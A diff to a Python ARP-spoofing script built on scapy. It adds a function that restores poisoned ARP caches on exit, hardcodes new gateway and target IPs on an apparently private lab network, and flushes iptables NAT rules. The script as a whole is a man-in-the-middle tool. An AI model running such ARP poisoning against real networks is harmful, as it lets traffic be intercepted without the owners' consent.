@@ -23,6 +23,12 @@ def spoof(target_ip, spoof_ip, target_mac):
   
     scapy.send(packet, verbose = False)
 
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
+    scapy.send(packet, verbose = False)
+
 def get_local_info():
     
     interfaces = netifaces.interfaces()
@@ -89,7 +95,8 @@ if __name__ == '__main__':
     address, netmask, broadcast, slash, gw = get_local_info()
 
     gateway_ip = gw
-    target_ip = '192.168.99.208' # server = '224.0.0.251', iot = '192.168.99.104'
+    gateway_ip = '192.168.99.100'
+    target_ip = '192.168.99.1' # server = '224.0.0.251', iot = '192.168.99.104'
     # target_mac = '6c:21:a2:5b:6e:02'
     print("Trying to reach target: 192.168.99.208 ...")
     target_mac = get_mac(target_ip)
@@ -121,5 +128,7 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         print("\nCtrl + C pressed.............Exiting")
         print("[-] Arp Spoof Stopped")
+        restore(gateway_ip, target_ip)
+        restore(target_ip, gateway_ip)
         os.system("iptables -t nat -F")
         print("stop thread")
